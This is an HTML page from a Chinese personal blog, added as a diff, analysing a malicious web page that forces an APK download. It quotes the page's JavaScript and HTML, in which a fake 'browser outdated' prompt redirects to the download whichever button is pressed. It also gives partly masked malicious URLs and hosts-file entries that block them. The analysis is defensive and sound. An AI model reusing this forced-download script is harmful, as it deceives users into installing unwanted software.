@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+<!-- Iushm OK -->
+<title>“下载浏览器”类恶意网页研究 Cy Sakarwei GHP</title>
+<link href="/favicon.svg" type="image/svg" rel="shotcut icon"/>
+
+<link rel="stylesheet" href="/suk_ghp/res/index.css">
+
+
+<script src="/suk_ghp/res/saka.js"></script>
+
+<meta charset="UTF-8">
+<meta name="author" content="Saka">
+<meta name="description" content="Mon Apr 06 2020 00:00:00 GMT+0800 二〇二〇年四月六日早上我发现了一个恶意网页。在我上网搜索资料的时候，突然弹出一个对话框让我升级浏览器，我拒绝后被下载浏览器。我向来很讨厌被这样强制下载安装软件。"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<!-- Igmj KSU je -->
+<body>
+  <div id="main">
+    <div class="page">
+      <div class="content">
+        <div id="ksu"><a href="/index.html"><img src="/suk_ghp/res/root.gif"/></a><a href="/suk_ghp/index.html"><img src="/suk_ghp/res/home.gif"/></a>&nbsp;SakaGHP Blog<hr/></div>
+        <section id="iushm">
+          
+<h1>“下载浏览器”类恶意网页研究</h1>
+<div class="irfrtani">
+	<m>於</m> <time>20年4月6日</time><br/>
+	
+	<m>作</m>
+	<a href="/suk_ghp/authors/tags/Cy-Saka">Saka</a>
+	
+
+	
+
+
+	<p class="iozuta">二〇二〇年四月六日早上我发现了一个恶意网页。在我上网搜索资料的时候，突然弹出一个对话框让我升级浏览器，我拒绝后被下载浏览器。我向来很讨厌被这样强制下载安装软件。</p>
+</div>
+<p>二〇二〇年四月六日早上我发现了一个恶意网页。在我上网搜索资料的时候，突然弹出一个对话框让我升级浏览器，我拒绝后被下载浏览器。</p>
+<p>【截图丢失】<br>我研究了一下，打开恶意网页，打开开发工具，我发现了三段特殊的代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> surl = <span class="string">&quot;https://e17ec110af43.oss-＊-sha＊gh＊i.aliy＊ncs.com/apk/2020/01/xiazai_1735＊3_121＊98051.apk&quot;</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">function</span> <span class="title function_">tanc</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> msg = <span class="title function_">confirm</span>(<span class="string">&quot;浏览器版本过低，请立即更新&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (msg == <span class="literal">true</span>) &#123;</span><br><span class="line">         location.<span class="property">href</span> = surl;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         location.<span class="property">href</span> = surl;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;,<span class="number">50</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> <span class="comment">// 省略了一些...</span></span><br><span class="line">       <span class="keyword">function</span> <span class="title function_">downapk</span>(<span class="params"></span>) &#123;</span><br><span class="line">       <span class="comment">// time2();</span></span><br><span class="line">       <span class="keyword">var</span> msg = <span class="title function_">confirm</span>(<span class="string">&quot;提示： 请勿直接退出，否则会导致浏览器崩溃&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (msg == <span class="literal">true</span>) &#123;</span><br><span class="line">         location.<span class="property">href</span> = surl;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">         location.<span class="property">href</span> = surl;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+<p>代码的意思：<br>显示：“浏览器版本过低，请立即更新”，之后不管你按确定还是取消，它都会带你到surl变量的网址，也就是恶意网页的网址</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;liulanqi1bgobox&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;downapk()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot; position:fixed; top:5px; right:5px; width:35px; height:18px; line-height:18px; background:#000; color:#fff; font-size:12px;  text-align:center; border-radius:3px; opacity:0.1&quot;</span>&gt;</span>广告<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ql-head className&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color: rgb(252, 72, 72);&quot;</span>&gt;</span>请勿直接退出，下载最新版高速浏览器<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ql-img&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./static/chucuo-2.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ql-shilian&quot;</span>&gt;</span>页面失联了！请立即更新...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>不管你点击网页的哪里，只要在div的范围内，它都会要求你的浏览器运行**downapk()**，就是下载apk。<br>病毒网址：<br>cdn.zhi＊anw.cc:3＊129&#x2F;sg200319＊&#x2F;sg.htm#<br>h＊ps:＊&#x2F;mp.xi9＊.com&#x2F;2019llq＊5&#x2F;p10＊6z.html</p>
+<blockquote>
+<p>2024年11月22日后记：下面的方法其实是治标不治本，一般最好的办法就是利用反广告插件，或者借助UserAgent和Platform伪装自己。</p>
+</blockquote>
+<p>这些可以通过修改 hosts 文件来防止，在Linux&#x2F;Unix&#x2F;安卓系统里，hosts文件在 &#x2F;etc&#x2F;hosts，需要root权限修改，Windows系统中，hosts应该在%HOMEDRIVER%\System32\drivers\etc\hosts，需要用管理员权限修改。HOMEDRIVER是看系统在哪个硬盘安装，一般是C:。<br>在 hosts 文件中加入：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.1</span>  cdn.zh＊nanw.cc:<span class="number">32129</span></span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.1</span>  mp.＊i9p.com</span><br></pre></td></tr></table></figure>
+<p>这样就能能让系统禁止访问那个恶意网站，就能防止其自动下载文件了。</p>
+
+
+
+
+        </section>
+        <hr/>
+        <center>&copy;2014~2024 Sakarwei<br/>除非另有声明，本站内容採用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 授權。<br/>頁末出現本字段之頁面，採用 Hexo 輔助生成<br/><img src="https://badges.toozhao.com/badges/01JC2K3JD6REFRFC50VPEP65MT/blue.svg"/></center>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
